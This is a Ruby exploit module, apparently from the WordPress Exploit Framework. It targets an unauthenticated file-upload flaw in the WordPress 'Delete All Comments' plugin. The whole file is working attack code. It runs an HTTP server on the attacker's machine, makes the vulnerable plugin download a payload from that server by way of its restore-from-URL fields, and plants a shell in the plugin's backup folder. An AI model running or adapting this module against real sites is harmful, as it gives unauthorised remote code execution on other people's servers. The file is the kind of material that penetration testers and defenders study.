# frozen_string_literal: true

class Wpxf::Exploit::DeleteAllCommentsShellUpload < Wpxf::Module
  include Wpxf::WordPress::ShellUpload
  include Wpxf::Net::HttpServer

  def initialize
    super

    update_info(
      name: 'Delete All Comments Unauthenticated Shell Upload',
      author: [
        'NinTechNet', # Discovery and disclosure
        'rastating'   # WPXF module
      ],
      references: [
        ['WPVDB', '8694'],
        ['URL', 'http://blog.nintechnet.com/arbitrary-file-upload-vulnerability-in-wordpress-delete-all-comments-plugin/']
      ],
      date: 'Dec 10 2016'
    )

    register_options([
      StringOption.new(
        name: 'http_server_host',
        desc: 'The external address of the host running this module',
        required: true
      )
    ])
  end

  def check
    check_plugin_version_from_readme('delete-all-comments')
  end

  def uploader_url
    normalize_uri(wordpress_url_plugins, 'delete-all-comments', 'delete-all-comments.php')
  end

  def download_url
    "http://#{datastore['http_server_host']}:#{http_server_bind_port}/#{Utility::Text.rand_alpha(8)}/#{payload_name}"
  end

  def payload_body_builder
    builder = Utility::BodyBuilder.new
    builder.add_field('restorefromfileURL', download_url)
    builder.add_field('restorefromfileNAME', payload_name)
    builder
  end

  def uploaded_payload_location
    normalize_uri(wordpress_url_plugins, 'delete-all-comments', 'backup', payload_name)
  end

  def on_http_request(_path, _params, _headers)
    payload.encoded
  end

  def run
    start_http_server(true)
    success = super
    stop_http_server
    success
  end
end
